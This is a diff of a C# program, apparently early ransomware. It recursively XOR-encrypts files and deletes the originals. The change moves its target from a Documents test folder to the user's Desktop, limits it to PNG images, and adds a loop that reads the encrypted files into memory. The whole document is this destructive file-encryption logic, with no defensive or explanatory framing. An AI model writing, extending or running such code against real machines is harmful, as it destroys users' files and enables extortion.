@@ -1,4 +1,6 @@
-﻿using System.IO;
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
 
 namespace crypt
 {
@@ -6,16 +8,26 @@ namespace crypt
     {
         static byte xorNumber = 145;
 
-        static string cryptFrom = @"C:\Users\user\Documents\crypt";
+        static string cryptFrom = @"C:\Users\user\Desktop";
+        static string filePattern = "*.png";
 
         static void Main(string[] args)
         {
             Encrypter XorEncrypter = new Encrypter((byte i) => EncryptionAlgorithms.XOR(i, xorNumber));
 
-            foreach (string file in Directory.EnumerateFiles(cryptFrom, "*.*", SearchOption.AllDirectories))
+            foreach (string file in Directory.EnumerateFiles(cryptFrom, filePattern, SearchOption.AllDirectories))
             {
                 XorEncrypter.Encrypt(file);
                 File.Delete(file);
+            }
+
+
+
+            List<byte[]> files = new List<byte[]>();
+
+            foreach (string file in Directory.EnumerateFiles(cryptFrom, filePattern, SearchOption.AllDirectories))
+            {
+                files.Add(File.ReadAllBytes(file));
             }
         }
     }
